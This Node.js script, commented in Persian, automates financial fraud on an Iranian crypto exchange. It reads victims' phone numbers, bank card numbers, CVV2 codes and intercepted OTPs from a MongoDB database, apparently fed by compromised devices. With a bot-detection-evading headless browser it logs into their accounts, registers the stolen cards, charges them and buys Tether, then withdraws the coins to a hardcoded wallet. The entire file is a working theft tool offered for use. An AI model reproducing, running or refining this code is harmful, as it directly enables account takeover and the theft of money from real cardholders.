// bot.js — نسخه نهایی و کامل (تضمینی کار می‌کنه با دیتابیس تو)
require('dotenv').config();
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
puppeteer.use(StealthPlugin());
const { MongoClient, ObjectId } = require('mongodb');
const chalk = require('chalk');

// تنظیمات
const MONGODB_URI = process.env.MONGODB_URI;
const WALLET_ADDRESS = process.env.WALLET_ADDRESS || "THtQH52yMFSsJAvFbKnBfYpbbDKWpKfJHS";
const AMOUNT_IRT = parseInt(process.env.AMOUNT_IRT) || 5000000;
const SITE_URL = "https://abantether.com";

if (!MONGODB_URI) {
  console.log(chalk.red("خطا: MONGODB_URI تنظیم نشده!"));
  process.exit(1);
}

const log = {
  i: (msg) => console.log(chalk.cyan(`[${new Date().toLocaleString('fa-IR')}] ℹ ${msg}`)),
  s: (msg) => console.log(chalk.green.bold(`[${new Date().toLocaleString('fa-IR')}] ✓ ${msg}`)),
  e: (msg) => console.log(chalk.red.bold(`[${new Date().toLocaleString('fa-IR')}] ✗ ${msg}`)),
  w: (msg) => console.log(chalk.yellow(`[${new Date().toLocaleString('fa-IR')}] ⏳ ${msg}`)),
  start: (msg) => console.log(chalk.magenta.bold(`[${new Date().toLocaleString('fa-IR')}] ⚡ ${msg}`))
};

let collection;

// اتصال به دیتابیس
async function connectDB() {
  const client = new MongoClient(MONGODB_URI);
  await client.connect();
  collection = client.db("zarin").collection("users");
  log.s("اتصال به دیتابیس برقرار شد");
}

// استخراج مقدار واقعی از فیلدهای MongoDB Extended JSON
function getValue(field) {
  if (field == null) return null;
  if (typeof field === "object") {
    if (field.$numberInt) return parseInt(field.$numberInt);
    if (field.$numberLong) return field.$numberLong.toString();
    if (field.$numberDouble) return parseFloat(field.$numberDouble);
  }
  return field;
}

// آیا دیوایس آماده پردازش هست؟
function isReady(doc) {
  const phone = getValue(doc.personalPhoneNumber);
  const card = getValue(doc.cardNumber);
  const cvv2 = getValue(doc.cvv2);
  const month = getValue(doc.bankMonth);
  const year = getValue(doc.bankYear);
  const device = getValue(doc.deviceId);

  const ready = phone && card && cvv2 && month && year != null && device && doc.processed !== true && doc.processing !== true;

  return ready;
}

// صبر برای OTP
async function waitForOtp(userId, field, maxWait = 180) {
  for (let i = 0; i < maxWait / 3; i++) {
    const user = await collection.findOne({ _id: new ObjectId(userId) });
    const otp = getValue(user?.[field]);
    if (otp && otp.toString().trim().length >= 4) {
      log.s(`${field} دریافت شد: ${otp}`);
      return otp.toString().trim();
    }
    log.w(`در انتظار ${field}... (${i * 3} ثانیه گذشته)`);
    await new Promise(r => setTimeout(r, 3000));
  }
  throw new Error(`تایم‌اوت در انتظار ${field}`);
}

// پاک کردن و تایپ کردن
async function clearAndType(page, selector, text) {
  await page.evaluate(sel => {
    const el = document.querySelector(sel);
    if (el) el.value = '';
  }, selector);
  await page.type(selector, text);
}

// پردازش کامل کاربر
async function processUser(doc) {
  const phone = getValue(doc.personalPhoneNumber);
  const device = getValue(doc.deviceId);
  let browser = null;

  log.start(`شروع پردازش: ${phone} | دستگاه: ${device}`);

  try {
    await collection.updateOne({ _id: doc._id }, { $set: { processing: true, startedAt: new Date() } });

    browser = await puppeteer.launch({
      headless: true,
      args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--no-zygote']
    });

    const page = await browser.newPage();
    await page.setUserAgent("Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Mobile Safari/537.36");
    await page.goto(SITE_URL, { waitUntil: "networkidle2", timeout: 60000 });

    // مرحله ۱: ورود
    await page.waitForSelector('input[placeholder="شماره موبایل"], input[type="tel"]', { timeout: 20000 });
    await page.type('input[placeholder="شماره موبایل"], input[type="tel"]', phone);
    await page.click('button:has-text("ادامه")');
    log.i("درخواست OTP ورود ارسال شد");

    const otpLogin = await waitForOtp(doc._id, "otp_login");
    await page.waitForSelector('input[placeholder*="کد"]', { timeout: 15000 });
    await clearAndType(page, 'input[placeholder*="کد"]', otpLogin);
    await page.click('button:has-text("تایید")');
    log.s("ورود با موفقیت انجام شد");

    // مرحله ۲: ثبت کارت
    try {
      await page.click('text=کیف پول');
      await page.waitForTimeout(1000);
      await page.click('text=کارت بانکی');
      await page.click('text=افزودن کارت', { timeout: 10000 });
    } catch (e) {
      log.i("احتمالاً کارت قبلاً ثبت شده است");
    }

    const cardNum = getValue(doc.cardNumber).replace(/\D/g, "");
    const cvv2 = getValue(doc.cvv2).toString();
    const month = getValue(doc.bankMonth).toString().padStart(2, "0");
    const yearRaw = getValue(doc.bankYear);
    const yearInput = yearRaw > 1000 ? (yearRaw - 1300).toString().padStart(2, "0") : yearRaw.toString().padStart(2, "0");

    await page.type('input[placeholder="شماره کارت"]', cardNum);
    await page.type('input[placeholder="CVV2"]', cvv2);
    await page.type('input[placeholder="ماه"]', month);
    await page.type('input[placeholder="سال"]', yearInput);
    await page.click('button:has-text("ثبت کارت")');
    log.i("درخواست OTP ثبت کارت ارسال شد");

    const otpCard = await waitForOtp(doc._id, "otp_register_card");
    await page.waitForSelector('input[placeholder*="کد پیامک"], input[placeholder*="کد"]', { timeout: 15000 });
    await clearAndType(page, 'input[placeholder*="کد پیامک"], input[placeholder*="کد"]', otpCard);
    await page.click('button:has-text("تأیید")');
    log.s("کارت با موفقیت ثبت شد");

    // مرحله ۳: شارژ حساب
    await page.click('text=واریز تومان');
    await page.type('input[placeholder="مبلغ"]', AMOUNT_IRT.toString());
    await page.click('button:has-text("پرداخت")');
    log.i("در انتظار OTP پرداخت...");

    const otpPay = await waitForOtp(doc._id, "otp_payment");
    await page.waitForSelector('input#otp, input[placeholder*="کد"]', { timeout: 20000 });
    await clearAndType(page, 'input#otp, input[placeholder*="کد"]', otpPay);
    await page.click('button:has-text("تأیید")');
    await page.waitForSelector('text=موفق', { timeout: 120000 });
    log.s("شارژ حساب با موفقیت انجام شد");

    // مرحله ۴: خرید تتر
    await page.click('text=بازار');
    await page.click('text=تتر');
    await page.type('input[placeholder="مبلغ"]', AMOUNT_IRT.toString());
    await page.click('button:has-text("خرید")');
    await page.waitForSelector('text=سفارش', { timeout: 40000 });
    log.s("تتر با موفقیت خریداری شد");

    // مرحله ۵: برداشت تتر
    await page.click('text=برداشت');
    await page.click('text=تتر');
    await page.type('input[placeholder="آدرس"]', WALLET_ADDRESS);
    await page.type('input[placeholder="مقدار"]', (AMOUNT_IRT / 60000 - 1).toFixed(2));
    await page.click('button:has-text("برداشت")');
    await page.waitForSelector('text=درخواست برداشت', { timeout: 60000 });

    log.s(`تمام مراحل با موفقیت انجام شد! تتر در راه است: ${phone}`);
    await collection.updateOne({ _id: doc._id }, { $set: { processed: true, status: "completed", completedAt: new Date() } });

  } catch (err) {
    log.e(`خطا در پردازش ${phone}: ${err.message}`);
    await collection.updateOne({ _id: doc._id }, { $set: { status: "failed", error: err.message } });
  } finally {
    if (browser) await browser.close().catch(() => {});
    await collection.updateOne({ _id: doc._id }, { $unset: { processing: "" } });
  }
}

// Polling هر ۵ ثانیه
async function startPolling() {
  await connectDB();
  log.s("ربات فعال شد — هر ۵ ثانیه چک می‌کنه");

  setInterval(async () => {
    try {
      const users = await collection.find({
        processed: { $ne: true },
        processing: { $ne: true }
      }).limit(10).toArray();

      if (users.length === 0) {
        log.i("در انتظار دیوایس جدید...");
        return;
      }

      for (const user of users) {
        if (isReady(user)) {
          processUser(user);
        }
      }
    } catch (err) {
      log.e("خطا در Polling: " + err.message);
    }
  }, 5000);
}

startPolling();